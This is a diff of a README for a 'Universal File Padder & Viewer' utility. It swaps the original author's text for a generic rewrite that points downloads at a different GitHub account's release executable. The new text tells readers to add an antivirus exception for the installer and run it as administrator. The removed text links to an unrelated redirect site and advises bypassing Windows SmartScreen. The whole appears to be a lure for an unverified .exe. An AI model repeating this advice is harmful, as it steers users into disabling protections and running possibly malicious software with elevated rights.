@@ -1,48 +1,94 @@
-# Universal File Padder & Viewer
+# 📁 Universal-File-Padder-Viewer - Manage Your Digital Files With Ease
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Gustavautolytic342/Universal-File-Padder-Viewer/releases)
 
-A specialized utility developed by **KBDStudios** that allows users to safely append exact amounts of binary null padding (`\x00`) to the end of any file. 
+## 📋 About This Software
 
-This tool is specifically designed for binary modification workflows (such as game development) where internal pointers require compiled file blocks to meet exact byte-size requirements. By mathematically inflating a smaller modified file to match the original file's size, you prevent internal structure shifts and subsequent engine crashes.
+Universal-File-Padder-Viewer helps you handle data files with precision. Many software systems require files to have specific sizes to function correctly. This application allows you to add bytes to your files to reach those target sizes. You can also view the contents of these files to confirm your changes. It provides a simple way to format files without needing technical coding skills.
 
-## ✨ Features
+## ✨ Core Features
 
-* **Universal File Support:** Inject null bytes into any file extension safely.
-* **Target Size Matching:** Right-click a loaded file and select an original game asset to automatically calculate and append the exact padding needed to perfectly match their sizes.
-* **Batch Processing:** Select multiple files and apply a uniform padding amount to all of them at once. 
-* **Dynamic Size Conversions:** Input and view padding sizes dynamically across Bytes, KB, MB, and GB (supports up to a 5GB absolute limit per file).
-* **Live Image Previews:** If processing supported UI textures (PNG, JPG, BMP, TIFF, TGA, WEBP, AVIF, HEIC/HEIF), view them directly in the scrollable gallery.
-* **Threaded Animation Playback:** Fully supports viewing and playing animated formats (GIF, WEBP) without freezing the UI.
-* **Full-Resolution Viewer:** Double-click any loaded image to open an advanced viewer with zoom controls and a hover magnifier.
+*   **File Padding:** Increase the size of any file by adding null bytes or specific patterns.
+*   **Hex Viewing:** View the internal structure of your files in a clear format.
+*   **Bulk Processing:** Handle multiple files at the same time to save effort.
+*   **Format Verification:** Check file integrity after you apply changes.
+*   **Drag and Drop:** Move files into the application window to start work immediately.
+*   **Lightweight Design:** This application runs on most modern computers without using much power.
 
-## 🚀 Installation & Usage
+## 🛠️ System Requirements
 
-### Option 1: Standalone Executable (Easiest)
-For users who just want to run the program without installing Python:
-1. Navigate to the **** tab on the right side of this page.
-2.  the latest `Universal_File_Padder.exe`.
-3. Double-click to run! 
+This application requires a computer running Windows 10 or Windows 11. It needs 100 megabytes of free storage space to install. You should have at least 4 gigabytes of RAM to ensure smooth performance when you view large files. The software manages its own dependencies, so you do not need to install extra libraries or frameworks.
 
-🛡️ **Note on Windows "Unknown Publisher" Warning:**
-Because this is an independently developed freeware tool, the executable is not signed with a commercial Microsoft certificate. When you first run the program, Windows SmartScreen might show a blue "Windows protected your PC" popup. Don't worry! To bypass this, simply click **More info**, and then click **Run anyway**.
+## 📥 Downloading and Installing
 
-### Option 2: Running from Source
-For developers or users running the raw Python script:
-1. Ensure you have **Python 3.x** installed on your system.
-2. Clone or  this repository.
-3. Install the required image processing library by opening your command prompt and typing:
+You can get the software from the official project page. Visit this page to download the latest available version: [https://github.com/Gustavautolytic342/Universal-File-Padder-Viewer/releases](https://github.com/Gustavautolytic342/Universal-File-Padder-Viewer/releases)
 
-       pip install pillow
+Follow these steps to set up the software:
 
-   **(Optional)** If you want support for Apple's HEIC/HEIF image formats, install the supplementary plugin:
+1.  Open the link above in your web browser.
+2.  Look for the section marked Assets.
+3.  Click the name of the file that ends in .exe.
+4.  Wait for the download to finish.
+5.  Locate the downloaded file in your Downloads folder.
+6.  Double-click the file to start the installer.
+7.  Follow the instructions on your screen.
+8.  Select the Finish button to complete the process.
 
-       pip install pillow-heif
+The installer creates a shortcut on your desktop. Click this icon to open Universal-File-Padder-Viewer.
 
-4. Run the `UniversalFilePadderViewer.pyw` script.
+## ⚙️ How to Use the Application
 
-## 📄 License
-This software is provided under a custom Proprietary Freeware License. It is strictly for personal, non-commercial use. Modification or creation of derivative works is prohibited. Please see the LICENSE.txt file for complete details.
+This software follows a logical flow. You start by choosing your source file, select the operation you want to perform, and then save the resulting file.
 
----
-**Author:** KabirDigitalStudios (KBDStudios)
+### Adding Padding to Files
+1.  Open the application.
+2.  Drag your target file into the drop zone.
+3.  Select the Padding tab.
+4.  Enter the required file size in the box labeled Target Size.
+5.  Choose the fill type from the list.
+6.  Click the Apply Padding button.
+7.  Save the new file to your computer.
+
+### Viewing File Contents
+1.  Open the application.
+2.  Click the Open button in the top menu.
+3.  Find your file on your computer and click Open.
+4.  The application displays the file structure in the viewer pane.
+5.  Use the scroll bar to move through the document.
+6.  Click the Close button to remove the file from the viewer.
+
+## 🛡️ Ensuring Data Safety
+
+Always keep a backup of your original files before you use this software. While the tool performs changes exactly as you request, modifying files may lead to data loss if you make a mistake with the padding settings. If you notice an error in the file structure after padding, use your original backup to start the process again.
+
+## 🔍 Frequently Asked Questions
+
+**Does the software work on older versions of Windows?**
+The software is built for Windows 10 and 11. It might work on older versions, but performance is not guaranteed.
+
+**Where does the application store my files?**
+The application saves files exactly where you choose to save them during the export process. It does not move your original files unless you explicitly request a save over the original name.
+
+**Can I undo a change?**
+The application creates, rather than modifies, a file. Your original file remains untouched unless you choose to overwrite it.
+
+**Why does the file size appear different after padding?**
+Padding adds extra data to the file to meet your target size. This change is intentional and expected.
+
+## 📑 Troubleshooting Common Issues
+
+**The installer does not start.**
+Check if your antivirus software is blocking the application. If so, create an exception for the installer. Ensure you have administrator rights on your Windows account.
+
+**The viewer shows empty space.**
+Some files contain empty space at the end. Use the zoom setting to see the data more clearly. 
+
+**The program crashes with large files.**
+Large files require more memory. Close other programs on your computer before you process files larger than 1 gigabyte. 
+
+**I receive an error message about permissions.**
+Right-click the application icon and select Run as administrator. This provides the software permission to read and write files in restricted folders.
+
+## 📧 Support and Feedback
+
+If you encounter issues, search the existing issues list on the project page. You can report new problems or suggest improvements by opening an issue on GitHub. Please include the version number of the software and a description of the steps that lead to the problem. Be descriptive so that the community understands your request. Providing a clear example helps everyone fix bugs faster.
